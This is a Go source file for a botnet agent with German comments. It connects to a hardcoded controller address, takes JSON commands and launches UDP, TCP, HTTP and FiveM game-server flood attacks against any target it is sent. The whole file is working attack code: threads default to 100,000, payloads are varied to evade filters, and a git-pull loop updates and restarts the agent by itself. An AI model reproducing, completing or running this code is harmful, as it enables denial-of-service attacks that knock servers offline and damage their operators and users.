package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Command structure to receive from controller
type AttackCommand struct {
	Method     string `json:"method"`
	TargetIP   string `json:"target_ip"`
	TargetPort int    `json:"target_port"`
	Threads    int    `json:"threads"`
	Duration   int    `json:"duration"`
}

func checkForUpdates() {
	for {
		time.Sleep(10 * time.Minute)
		// Prueft GitHub Repository auf Aenderungen (git pull)
		cmd := exec.Command("git", "pull")
		output, err := cmd.CombinedOutput()
		if err == nil && !strings.Contains(string(output), "Already up to date") {
			fmt.Println("[AUTO-UPDATE] Update gefunden! Starte Agent neu...")

			// Startet den Prozess neu mit den gleichen Argumenten
			newCmd := exec.Command(os.Args[0], os.Args[1:]...)
			newCmd.Stdout = os.Stdout
			newCmd.Stderr = os.Stderr
			newCmd.Stdin = os.Stdin

			err := newCmd.Start()
			if err != nil {
				fmt.Printf("[AUTO-UPDATE] Fehler beim Neustart: %v\n", err)
				continue
			}

			os.Exit(0) // Beende alten Prozess
		}
	}
}

// UdpFlood implements the UDP flood attack (User Logic)
func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int, stop chan struct{}) {
	if SIZE <= 0 {
		SIZE = 1472
	}
	var wg sync.WaitGroup
	fmt.Printf("[%s] UDP Attack started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	payload := make([]byte, SIZE)
	rand.Read(payload)
	addr := net.JoinHostPort(IP, PORT)

	if THREADS <= 0 {
		THREADS = 100000 // Erhoeht auf 100k fuer maximale Last (wie gewuenscht)
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, _ := net.Dial("udp", addr)
			if conn == nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-stop:
					return
				default:
					conn.Write(payload)
				}
			}
		}()
	}

	select {
	case <-time.After(time.Duration(SECONDS) * time.Second):
	case <-stop:
	}
	wg.Wait()
}

// TcpFlood implements the TCP flood attack
func TcpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] TCP Attack started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	addr := net.JoinHostPort(IP, PORT)

	if THREADS <= 0 {
		THREADS = 100000 // Erhoeht auf 100k
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
					if err == nil {
						conn.Close()
					}
				}
			}
		}()
	}

	select {
	case <-time.After(time.Duration(SECONDS) * time.Second):
	case <-stop:
	}
	wg.Wait()
	fmt.Println("TCP Attack finished.")
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
}

// HttpFlood implements a Layer 7 HTTP GET flood with rotated User-Agents
func HttpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] HTTP Attack started: %s:%s for %ds (UA Rotation)\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	addr := net.JoinHostPort(IP, PORT)

	if THREADS <= 0 {
		THREADS = 100000 // Erhoeht auf 100k
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
					if err == nil {
						ua := userAgents[rand.Intn(len(userAgents))]
						payload := []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", IP, ua))
						conn.Write(payload)
						conn.Close()
					}
				}
			}
		}()
	}

	select {
	case <-time.After(time.Duration(SECONDS) * time.Second):
	case <-stop:
	}
	wg.Wait()
	fmt.Println("HTTP Attack finished.")
}

// FiveMFlood implements specialized UDP flood for FiveM servers
func FiveMFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] FiveM Attack started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
	addr := net.JoinHostPort(IP, PORT)

	// Vary the query types to bypass simple filters
	payloads := [][]byte{
		[]byte("\xff\xff\xff\xffgetinfo xxx"),
		[]byte("\xff\xff\xff\xffgetstatus xxx"),
		[]byte("\xff\xff\xff\xffgetplayers xxx"),
	}

	if THREADS <= 0 {
		THREADS = 100000 // Erhoeht auf 100k
	}

	for i := 0; i < THREADS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, _ := net.Dial("udp", addr)
			if conn == nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-stop:
					return
				default:
					payload := payloads[rand.Intn(len(payloads))]
					conn.Write(payload)
				}
			}
		}()
	}

	select {
	case <-time.After(time.Duration(SECONDS) * time.Second):
	case <-stop:
	}
	wg.Wait()
	fmt.Println("FiveM Attack finished.")
}

func main() {
	go checkForUpdates()

	// HIER DEINE CONTROLLER-IP EINTRAGEN
	controllerAddr := "89.36.35.109:9999"

	for {
		fmt.Printf("Verbinde zu Controller %s... \n", controllerAddr)
		conn, err := net.Dial("tcp", controllerAddr)
		if err != nil {
			fmt.Printf("Verbindung fehlgeschlagen, versuche es in 5 Sekunden erneut...\n")
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Println("Verbunden ueber TCP! Warte auf Befehle...")
		decoder := json.NewDecoder(conn)

		// Standby-Mechanismus: Erstellen eines Kanals zum Stoppen laufender Aktionen
		stopAll := make(chan struct{})

		for {
			var cmd AttackCommand
			if err := decoder.Decode(&cmd); err != nil {
				fmt.Printf("Verbindung verloren: Gehe in Standby... (%v)\n", err)
				close(stopAll) // Signalisiert allen Angriffen zu stoppen
				conn.Close()
				break
			}

			fmt.Printf("Befehl empfangen: %s auf %s:%d (Threads: %d, Dauer: %d)\n",
				cmd.Method, cmd.TargetIP, cmd.TargetPort, cmd.Threads, cmd.Duration)

			switch cmd.Method {
			case "UDP":
				go UdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472, cmd.Threads, stopAll)
			case "TCP":
				go TcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
			case "HTTP":
				go HttpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
			case "FIVEM":
				go FiveMFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
			default:
				fmt.Printf("Unbekannte Methode: %s\n", cmd.Method)
			}
		}
	}
}
